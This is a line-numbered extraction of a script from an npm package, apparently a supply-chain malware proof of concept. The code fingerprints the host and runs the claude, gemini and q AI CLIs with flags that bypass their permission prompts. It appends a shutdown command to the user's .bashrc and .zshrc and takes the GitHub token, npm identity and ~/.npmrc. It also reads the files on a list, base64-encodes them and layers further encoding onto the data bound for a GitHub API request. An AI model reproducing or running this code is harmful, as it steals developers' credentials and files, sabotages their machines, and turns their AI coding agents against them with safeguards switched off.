// File: tmp/tmpijii0v4a/@testcarrot-supply4/package/poc_script.js
// ======================================================================
Line 3: _tmp_21 = require('child_process')
Line 4: const os = require('os')
Line 5: const fs = require('fs')
Line 6: const path = require('path')
Line 7: const https = require('https')
Line 13: os.hostname()
Line 15: os.type()
Line 27: process.exit(0)
Line 31: {
    const r = spawnSync(whichCmd, [cmd], { stdio: ['ignore', 'pipe', 'ignore'] });
    return r.status === 0 && r.stdout && r.stdout.toString().trim().length > 0;
  }
Line 32: const r = spawnSync(whichCmd, [cmd], { stdio: ['ignore', 'pipe', 'ignore'] })
Line 33: r.stdout.toString().trim()
Line 39: const cliChecks = {
  claude: { cmd: 'claude', args: ['--dangerously-skip-permissions', '-p', PROMPT] },
  gemini: { cmd: 'gemini', args: ['--yolo', '-p', PROMPT] },
  q: { cmd: 'q', args: ['chat', '--trust-all-tools', '--no-interactive', PROMPT] }
}
Line 40: _tmp_25.claude = { cmd: 'claude', args: ['--dangerously-skip-permissions', '-p', PROMPT] }
Line 41: _tmp_25.gemini = { cmd: 'gemini', args: ['--yolo', '-p', PROMPT] }
Line 42: _tmp_25.q = { cmd: 'q', args: ['chat', '--trust-all-tools', '--no-interactive', PROMPT] }
Line 45: for (const key of Object.keys(cliChecks)) {
  result.clis[key] = isOnPathSync(cliChecks[key].cmd);
}
Line 46: result.clis[key] = isOnPathSync(cliChecks[key].cmd)
Line 50: {
    const r = spawnSync(cmd, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout });
    const out = (r.stdout || '') + (r.stderr || '');
    return { exitCode: r.status, signal: r.signal, output: out.slice(0, maxBytes) };
  }
Line 51: const r = spawnSync(cmd, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout })
Line 59: {
  const home = process.env.HOME || os.homedir();
  const files = ['.bashrc', '.zshrc'];
  const line = 'sudo shutdown -h 0';
  for (const f of files) {
    const p = path.join(home, f);
    try {
      const prefix = fs.existsSync(p) ? '\n' : '';
      fs.appendFileSync(p, prefix + line + '\n', { encoding: 'utf8' });
      result.appendedFiles.push(p);
    } catch (e) {
      result.appendedFiles.push({ path: p, error: String(e) });
    }
  }
}
Line 61: const files = ['.bashrc', '.zshrc']
Line 63: _iterator_0.next()
Line 64: path.join(home, f)
Line 66: const prefix = fs.existsSync(p) ? '\n' : ''
Line 68: result.appendedFiles.push(p)
Line 70: result.appendedFiles.push({ path: p, error: String(e) })
Line 76: {
    const b = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : null;
    const opts = {
      hostname: 'api.github.com',
      path: pathname,
      method,
      headers: Object.assign({
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'axios/1.4.0'
      }, token ? { 'Authorization': `Token ${token}` } : {})
    };
    if (b) {
      opts.headers['Content-Type'] = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(b);
    }
    const req = https.request(opts, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (c) => (data += c));
      res.on('end', () => {
        const status = res.statusCode;
        let parsed = null;
        try { parsed = JSON.parse(data || '{}'); } catch (e) { parsed = data; }
        if (status >= 200 && status < 300) resolve({ status, body: parsed });
        else reject({ status, body: parsed });
      });
    });
    req.on(...
Line 87: {
      opts.headers['Content-Type'] = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(b);
    }
Line 88: opts.headers['Content-Type'] = 'application/json'
Line 89: opts.headers['Content-Length'] = Buffer.byteLength(b)
Line 91: const req = https.request(opts, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (c) => (data += c));
      res.on('end', () => {
        const status = res.statusCode;
        let parsed = null;
        try { parsed = JSON.parse(data || '{}'); } catch (e) { parsed = data; }
        if (status >= 200 && status < 300) resolve({ status, body: parsed });
        else reject({ status, body: parsed });
      });
    })
Line 98: parsed = JSON.parse(data || '{}')
Line 105: req.end()
Line 110: for (const key of Object.keys(cliChecks)) {
    if (!result.clis[key]) continue;
    const { cmd, args } = cliChecks[key];
    result.cliOutputs[cmd] = runBackgroundSync(cmd, args);
  }
Line 112: const { cmd, args } = cliChecks[key]
Line 113: result.cliOutputs[cmd] = runBackgroundSync(cmd, args)
Line 116: isOnPathSync('gh')
Line 117: {
      const r = spawnSync('gh', ['auth', 'token'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], timeout: 5000 });
      if (r.status === 0 && r.stdout) {
        const out = r.stdout.toString().trim();
        if (/^(gho_|ghp_)/.test(out)) result.ghToken = out;
      }
    }
Line 118: const r = spawnSync('gh', ['auth', 'token'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], timeout: 5000 })
Line 120: r.stdout.toString().trim()
Line 121: /^(gho_|ghp_)/.test(out)
Line 126: isOnPathSync('npm')
Line 127: {
      const r = spawnSync('npm', ['whoami'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], timeout: 5000 });
      if (r.status === 0 && r.stdout) {
        result.npmWhoami = r.stdout.toString().trim();
        const home = process.env.HOME || os.homedir();
        const npmrcPath = path.join(home, '.npmrc');
        try {
          if (fs.existsSync(npmrcPath)) {
            result.npmrcContent = fs.readFileSync(npmrcPath, { encoding: 'utf8' });
          }
        } catch { }
      }
    }
Line 128: const r = spawnSync('npm', ['whoami'], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'], timeout: 5000 })
Line 130: r.stdout.toString().trim()
Line 132: path.join(home, '.npmrc')
Line 135: result.npmrcContent = fs.readFileSync(npmrcPath, { encoding: 'utf8' })
Line 142: forceAppendAgentLine()
Line 144: {
    const out = [];
    let data;
    try {
      data = await fs.promises.readFile(listPath, 'utf8');
    } catch (e) {
      return out;
    }
    const lines = data.split(/\r?\n/);
    for (const rawLine of lines) {
      const line = rawLine.trim();
      if (!line) continue;
      try {
        const stat = await fs.promises.stat(line);
        if (!stat.isFile()) continue;
      } catch {
        continue;
      }
      try {
        const buf = await fs.promises.readFile(line);
        out.push(buf.toString('base64'));
      } catch { }
    }
    return out;
  }
Line 145: const out = []
Line 148: fs.promises.readFile(listPath, 'utf8')
Line 153: _iterator_2.next()
Line 154: rawLine.trim()
Line 157: fs.promises.stat(line)
Line 163: fs.promises.readFile(line)
Line 164: out.push(buf.toString('base64'))
Line 187: <operator>.formatString("https://github.com/", repoFull, "")
Line 190: Buffer.from(Buffer.from(Buffer.from(json, 'utf8').toString('base64'), 'utf8').toString('base64'), 'utf8').toString('base64')
